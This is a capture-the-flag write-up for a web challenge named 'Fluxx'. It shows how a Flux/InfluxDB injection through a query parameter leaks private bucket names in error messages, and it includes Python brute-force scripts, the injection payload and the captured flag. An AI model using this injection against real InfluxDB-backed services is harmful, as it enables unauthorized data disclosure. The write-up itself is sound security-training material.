# Fluxx

## Description
```
Recently I have made a simple app for monitoring and analyzing metrics, events, and real-time data.I used a database which is designed for handling high volumes of timestamped data. 
But I think its vulnerable find it and get he flag.

To be noted: The challenge resets after sometime. So please wait for a while if you see any error. 
```

## Writeup
Visiting the website I got some interesting response. <br/>
```
Please visit /query?data= to travel with time.
```

For efficiency reasons I made a python script to send my payload. <br/>
```py
import requests

base_URL = 'http://66.228.53.87:9001/'

data = '1" OR 1=1--'

req = requests.get(f'{base_URL}query?data={data}')

print(req.text)
```

Executing this gives me an interesting response. <br/>
```sh
kali@kali python3 ./solve.py
HttpError: compilation failed: error @1:82-1:158: expected RPAREN, got EOF     

error @1:152-1:153: invalid expression @1:151-1:152: =

error @1:155-1:158: got unexpected token in string expression @1:158-1:158: EOF
```

Looking up the error I found that it was a response from `InfluxDB`. <br/>
Knowing that I looked up `NoSQL-Injection` for InfluxDB where I found a good [Website](https://rafa.hashnode.dev/influxdb-nosql-injection). <br/>
There I found the query below which is able to enumerate private buckets. <br/>
```
") |> yield(name: "1337") 
buckets() |> filter(fn: (r) => r.name =~ /^a.*/ and die(msg:r.name)) 
//
```

Having this I wrote a python script to bruteforce every private bucket possible. <br/>
```py
import requests, urllib.parse

base_URL = 'http://66.228.53.87:9001/'

letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

for char in list(letters):

    payload = f'") |> yield(name: "1337")\nbuckets() |> filter(fn: (r) => r.name =~ /^{char}.*/ and die(msg:r.name))\n//'

    encoded_payload = urllib.parse.quote(payload, safe='')
    req = requests.get(f'{base_URL}query?data={encoded_payload}')

    if req.text != '[]':
        print(req.text)
```

Executing this I was able to obtain the flag which concludes this writeup. <br/>
```sh
kali@kali python3 ./solve.py
HttpError: runtime error @2:14-2:69: filter: failed to evaluate filter function: KCTF{g0UPqVWa0eUT2wF2ipzX3v5pxikvqYhxR9OL}
```